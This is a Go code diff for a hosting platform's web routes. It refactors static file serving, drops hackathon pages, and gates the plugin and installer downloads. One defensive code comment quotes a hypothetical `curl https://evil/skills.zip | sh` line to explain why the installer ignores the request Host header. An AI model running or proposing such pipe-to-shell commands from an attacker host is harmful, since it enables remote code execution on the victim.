@@ -95,30 +95,40 @@ func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string, sh *SiteHandler)
 	mux.Handle("GET /docs", http.RedirectHandler("/docs/", http.StatusMovedPermanently))
 	mux.Handle("GET /docs.html", http.RedirectHandler("/docs/", http.StatusMovedPermanently))
 	sub, _ := fs.Sub(assets.staticFS(), "static")
-	handlerOnly := handlerOnlyFS{sub, sh.ed.Presentation().ProductAssets, assets.rewritten()}
-	fileServer := hostDiagram(sh.ed.Routes().HostedEvents, http.FileServerFS(handlerOnly))
-	staticServer := fileServer
-	fileServer = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		name := strings.TrimPrefix(r.URL.Path, "/")
-		if name != "" {
-			if _, err := fs.Stat(handlerOnly, name); err != nil {
-				if sh.ed.Routes().HostedEvents {
-					sh.renderNotFound(w, r, r.URL.Path)
-				} else {
-					// Same baseline-vs-self split as renderNotFound
-					// (showcase.go): the hosted literal must stay
-					// byte-identical; a self-hosted install names itself.
-					backLabel := "Go to simple-host.app"
-					if sh.pipeline().hostedOwner() == "" {
-						backLabel = "Go to " + sh.siteDomain
+	// fileServerFor is the static file server over one view of the tree,
+	// with this install's 404 page for a name the view does not have.
+	fileServerFor := func(view handlerOnlyFS) http.Handler {
+		staticServer := hostDiagram(sh.ed.Routes().HostedEvents, http.FileServerFS(view))
+		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			name := strings.TrimPrefix(r.URL.Path, "/")
+			if name != "" {
+				if _, err := fs.Stat(view, name); err != nil {
+					if sh.ed.Routes().HostedEvents {
+						sh.renderNotFound(w, r, r.URL.Path)
+					} else {
+						// Same baseline-vs-self split as renderNotFound
+						// (showcase.go): the hosted literal must stay
+						// byte-identical; a self-hosted install names itself.
+						backLabel := "Go to simple-host.app"
+						if sh.pipeline().hostedOwner() == "" {
+							backLabel = "Go to " + sh.siteDomain
+						}
+						sh.renderNotFoundPage(w, r, "Page not found", "The page you’re looking for doesn’t exist.", "/", backLabel)
 					}
-					sh.renderNotFoundPage(w, r, "Page not found", "The page you’re looking for doesn’t exist.", "/", backLabel)
+					return
 				}
-				return
 			}
-		}
-		staticServer.ServeHTTP(w, r)
-	})
+			staticServer.ServeHTTP(w, r)
+		})
+	}
+	// The platform's file server never answers a product's own names: those
+	// are reachable only where the product mounted ProductFiles.
+	handlerOnly := handlerOnlyFS{FS: sub, hidden: assets.product.own, rewritten: assets.rewritten()}
+	fileServer := fileServerFor(handlerOnly)
+	if len(assets.product.own) > 0 {
+		own := handlerOnlyFS{FS: sub, rewritten: assets.rewritten()}
+		assets.product.fileServer = assets.adminUICSP(sh.ownerAppOrStatic(assets.chromeFileServer(own, fileServerFor(own))))
+	}
 
 	// Assets that name the host are intercepted ONLY on an instance that needs
 	// rewriting. On simple-host.app the file server keeps serving them exactly
@@ -154,10 +164,8 @@ func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string, sh *SiteHandler)
 	mux.HandleFunc("GET /.well-known/api-catalog", discoveryDocument(assets, sh.ed.Presentation().ProductAssets, "api-catalog", `application/linkset+json;profile="https://www.rfc-editor.org/info/rfc9727"`, publicBaseURL))
 	if !sh.ed.Presentation().ProductAssets {
 		mux.HandleFunc("GET /skills.zip", func(w http.ResponseWriter, r *http.Request) { serveSkillsZip(assets, w, r) })
+		mux.HandleFunc("GET /skills/version", serveSkillsVersion)
 	}
-	mux.HandleFunc("GET /skills/version", func(w http.ResponseWriter, r *http.Request) {
-		serveSkillsVersion(w, r, sh.ed.Presentation().ProductAssets)
-	})
 	// The landing film's video and poster files (film.go).
 	mux.HandleFunc("GET /film/{file}", serveFilm)
 	// Per-skill download routes, derived from the bundle rather than hand-listed:
@@ -173,11 +181,13 @@ func RegisterUIRoutes(mux *http.ServeMux, publicBaseURL string, sh *SiteHandler)
 			assets.serveSkillReference(w, r)
 		})
 	}
-	mux.HandleFunc("GET /plugin.zip", func(w http.ResponseWriter, r *http.Request) {
-		servePluginZip(assets, w, r, sh.ed.Presentation().ProductAssets)
-	})
-	mux.HandleFunc("GET /install.sh", serveInstallScript(publicBaseURL, sh.ed.Presentation().ProductAssets))
-	mux.HandleFunc("GET /install.ps1", serveInstallPowerShell(publicBaseURL, sh.ed.Presentation().ProductAssets))
+	// The platform's plugin archive and installers. A product answers these
+	// three addresses itself, as it does /skills.zip.
+	if !sh.ed.Presentation().ProductAssets {
+		mux.HandleFunc("GET /plugin.zip", func(w http.ResponseWriter, r *http.Request) { servePluginZip(assets, w, r) })
+		mux.HandleFunc("GET /install.sh", serveInstallScript(publicBaseURL))
+		mux.HandleFunc("GET /install.ps1", serveInstallPowerShell(publicBaseURL))
+	}
 	// Admin dashboard: all signed-up users + their sites. This shell is public —
 	// a browser navigation carries no API key, so it cannot be gated server-side.
 	// It renders nothing until /v1/admin/users answers, and that IS gated; a
@@ -306,24 +316,14 @@ var handlerOnlyPages = map[string]bool{
 	"notfound.html":     true,
 	"showcase.html":     true,
 	"host-story.html":   true,
-	// The hackathon platform's pages (EVENTS=hosted): the signed-in app shell
-	// (static/hack/app.html, under hack/ so it is already outside this
-	// top-level map) is served by RegisterHackUI's own handler, hack-story.html
-	// at / is served by RegisterHackHome, and hack-event.html is the event
-	// page's template.
-	"hack-home.html":               true,
-	"hack-story.html":              true,
-	"hack-watch.html":              true,
-	"hack-event.html":              true,
-	"hack-get-started.html":        true,
-	"hack-companies.html":          true,
-	".well-known/hack-ard.json":    true,
-	".well-known/hack-api-catalog": true,
 }
 
 type handlerOnlyFS struct {
 	fs.FS
-	hackAssets bool
+	// hidden are a product's own file names (SetProductAssets): the
+	// platform's file server does not answer them. Nil in the view the
+	// product's file handler (ProductFiles) serves from.
+	hidden map[string]string
 	// rewritten is the constructing pipeline's rewritten(): whether this
 	// instance needs assets intercepted and served through a rewriting
 	// handler rather than straight off the embedded FS.
@@ -335,7 +335,10 @@ func (f handlerOnlyFS) Open(name string) (fs.File, error) {
 	// instance still serves them straight off the embedded FS. The chrome
 	// partials are fragments for chrome.go, never pages in their own right,
 	// and the landing film's files are served by serveFilm (film.go).
-	if name == "openapi.yaml" || name == "openapi.json" || name == "hack-llms.txt" || name == "hack-auth.md" || handlerOnlyPages[name] || (f.hackAssets && (name == "hack-directory.html" || name == "hack-voting.html")) || name == "partials" || strings.HasPrefix(name, "partials/") || name == "film" || strings.HasPrefix(name, "film/") || (f.rewritten && slices.Contains(rewrittenAssets, name)) {
+	if _, own := f.hidden[name]; own {
+		return nil, &fs.PathError{Op: "open", Path: name, Err: fs.ErrNotExist}
+	}
+	if name == "openapi.yaml" || name == "openapi.json" || handlerOnlyPages[name] || name == "partials" || strings.HasPrefix(name, "partials/") || name == "film" || strings.HasPrefix(name, "film/") || (f.rewritten && slices.Contains(rewrittenAssets, name)) {
 		return nil, &fs.PathError{Op: "open", Path: name, Err: fs.ErrNotExist}
 	}
 	return f.FS.Open(name)
@@ -354,19 +357,6 @@ func (p *assetPipeline) serveStaticPage(name string) http.Handler {
 		}
 		if name == "pricing.html" {
 			body = applyPricingNumbers(body, p.hostedEvents, p.limits)
-		}
-		if p.pres.ProductAssets && name == "hack-get-started.html" && p.inkBaseURL() != canonicalHackBaseURL {
-			// GitHub skills name the hosted service. Install the local ZIP instead.
-			start := bytes.Index(body, []byte("<li>Install the five Simple Hack skills"))
-			if start >= 0 {
-				end := bytes.Index(body[start:], []byte("</li>"))
-				if end >= 0 {
-					step := []byte(`<li>Download the <a href="/skills.zip" download>five Simple Hack skill folders</a>, install them in your agent’s skills directory, then restart your agent.</li>`)
-					body = append(append(append([]byte{}, body[:start]...), step...), body[start+end+5:]...)
-				}
-			}
-			body = bytes.ReplaceAll(body, []byte("with Google or an email code"), []byte("with an email code or a configured sign-in provider"))
-			body = bytes.ReplaceAll(body, []byte("Yes. Running an event, joining, judging and hosting team sites are free."), []byte("Simple Hack is free software. Server, domain and email costs are your provider’s bill."))
 		}
 		w.Header().Set("Content-Type", "text/html; charset=utf-8")
 		if p.chromeHack {
@@ -427,8 +417,8 @@ func (p *assetPipeline) uiCSP(next http.Handler, frameSrc string) http.Handler {
 // serveSkillsVersion returns {"version":"X"} from the embedded plugin.json.
 // Used by the MCP client for explicit version checks; the inline notice
 // middleware also reads the same value at boot.
-func serveSkillsVersion(w http.ResponseWriter, r *http.Request, hackAssets bool) {
-	version, err := PluginVersion(hackAssets)
+func serveSkillsVersion(w http.ResponseWriter, r *http.Request) {
+	version, err := PluginVersion(false)
 	if err != nil {
 		http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
 		return
@@ -497,11 +487,7 @@ func (p *assetPipeline) serveSkillMarkdown(skillName string) http.HandlerFunc {
 
 // servePluginZip returns the wrapped plugin layout (.claude-plugin/plugin.json
 // + skills/<name>/SKILL.md), suitable for `claude --plugin-url <url>`.
-func servePluginZip(assets *assetPipeline, w http.ResponseWriter, r *http.Request, hackAssets bool) {
-	if hackAssets {
-		http.Error(w, "this legacy plugin download was withdrawn", http.StatusGone)
-		return
-	}
+func servePluginZip(assets *assetPipeline, w http.ResponseWriter, r *http.Request) {
 	data, err := assets.buildPluginZip()
 	if err != nil {
 		http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
@@ -523,13 +509,9 @@ func servePluginZip(assets *assetPipeline, w http.ResponseWriter, r *http.Reques
 // `sh`, so reflecting an attacker-controlled Host header would let a crafted
 // request produce a `curl https://evil/skills.zip | sh` (remote code execution
 // on the victim). PublicBaseURL already carries the correct https scheme.
-func serveInstallScript(publicBaseURL string, hackAssets bool) http.HandlerFunc {
+func serveInstallScript(publicBaseURL string) http.HandlerFunc {
 	base := strings.TrimRight(publicBaseURL, "/")
 	return func(w http.ResponseWriter, r *http.Request) {
-		if hackAssets {
-			http.Error(w, "this installer was withdrawn", http.StatusGone)
-			return
-		}
 		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
 		w.Header().Set("Cache-Control", "no-cache")
 		w.Write([]byte(installScript(base)))
@@ -578,13 +560,9 @@ echo "Restart your agent if it caches the skills directory."
 // Same RCE reasoning as serveInstallScript — the download base is the
 // server-configured PublicBaseURL, never the request Host, because this is
 // meant to be run as `irm …/install.ps1 | iex`.
-func serveInstallPowerShell(publicBaseURL string, hackAssets bool) http.HandlerFunc {
+func serveInstallPowerShell(publicBaseURL string) http.HandlerFunc {
 	base := strings.TrimRight(publicBaseURL, "/")
 	return func(w http.ResponseWriter, r *http.Request) {
-		if hackAssets {
-			http.Error(w, "this installer was withdrawn", http.StatusGone)
-			return
-		}
 		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
 		w.Header().Set("Cache-Control", "no-cache")
 		w.Write([]byte(installPowerShellScript(base)))
